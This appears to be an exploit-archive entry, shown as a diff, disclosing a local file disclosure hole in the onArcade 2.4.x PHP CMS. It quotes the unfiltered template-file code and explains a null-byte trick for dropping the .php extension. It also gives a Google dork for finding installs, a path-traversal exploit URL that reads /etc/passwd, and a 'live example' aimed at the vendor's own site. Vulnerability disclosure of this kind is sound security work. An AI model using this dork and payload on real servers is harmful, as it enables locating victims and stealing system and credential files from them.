@@ -1,0 +1,108 @@
+id: 27410
+date: 03/24/2017
+title: onArcade 2.4.x Local File Disclosure Vulnerability
+author: Deyaa Muhammad
+cves: 
+
+# Exploit Title: onArcade 2.4.x Local File Get Contents Vulnerability
+# Google Dork: inurl:"cup.php?a=all"
+# Date: 23 Mar 2017
+# Exploit Author: Deyaa Muhammad
+# Author Mail: contact [at] deyaa.me
+# Exploit Blog:
+http://www.deyaa.me/2017/03/onArcade-2.4.x-Local-File-Get-Contents-Vulnerability.html
+# POC Video : https://youtu.be/IoQ0Z1OdZF0
+# Vendor Homepage: http://www.onarcade.com/
+# Demo Link: http://www.onarcade.com/Main/Demo
+# Version: 2.4.x
+# Tested on: 4.9.8-1-ARCH
+
+[1] Introduction
+
+Hello World,
+onArcade is a nice PHP CMS Software that handle videos and online games
+content,
+As you can see [3] there is no enough filtering for template file handling,
+which leads to file_get_contents() vulnerability.
+
+[2] Vulnerable Versions
+
+onArcade 2.4.2
+onArcade 2.4.1
+onArcade 2.4.0
+
+[3] Bug Track
+
+Because of the special treatment for .php extension, we wont be able to
+read the files with php extension
+But , you may use Null-Byte %00 to bypass this problem and "drop" the
+extension in file path when PHP <= 5.3.4
+
+File Link :
+https://gist.github.com/deyaamuhammad/a77021cbed2285e12c59f3c0eed45af5#file-templates-php-L57
+File Path : /srv/http/onarcade242/admin/templates.php
+Line    : 57
+[code]
+    case 'template_values':
+        $file_name = './templates/'. $_GET['template'] .'/'. $_GET['file'];
+        $file_type = strtolower(substr($_GET['file'], -3));
+        if ($file_type == '.js') {
+            $file_type = 'js';
+        }
+
+        if (!file_exists($file_name) || !($contents =
+@file_get_contents($file_name))) {
+            $template->json_error($lang['no_page_found']);
+        }
+
+        // array returned to user
+        $return = array('error'    =>    false,
+            'type'    =>    $file_type,
+            'code'    =>    ''
+        );
+
+        // process PHP template file
+        if ($file_type == "php") {
+            if (!isset($_GET['function'])) {
+                // get all templates list
+                $return['functions'] = array();
+                preg_match_all("#{template\\s([^}]*)}.+?{/template}#s",
+$contents, $matches);
+                foreach ($matches[1] AS $match) {
+                    $return['functions'][] = $match;
+                }
+                unset($matches);
+
+                if (!empty($return['functions'])) {
+                    $function = trim($return['functions'][0]);
+                }
+            } else {
+                $function = trim($_GET['function']);
+            }
+
+            if (preg_match("#{template\\s+". str_replace(array('(', ')',
+'$'), array('\\(', '\\)', '\\$'), $function)
+."\\s*}\n?(.+?)\n?{/template}#s", $contents, $match) > 0) {
+                $return['code'] = $match[1];
+            } else {
+                $template->json_error('Template not found.');
+            }
+        } else {
+            $return['code'] = $contents;
+        }
+
+        $template->json($return);
+        break;
+[/code]
+
+[4] Conclusion
+
+be safe don't upload this to your server.
+
+[5] Exploit
+http://www.target.com/onarcade242/admin/templates.php?a=template_values&file=../../../../../etc/passwd
+
+[6] Live Example
+http://www.onarcade.com/onarcade242/admin/templates.php?a=template_values&file=../../../../../etc/passwd
+
+#  0day.today [2023-03-22]  #
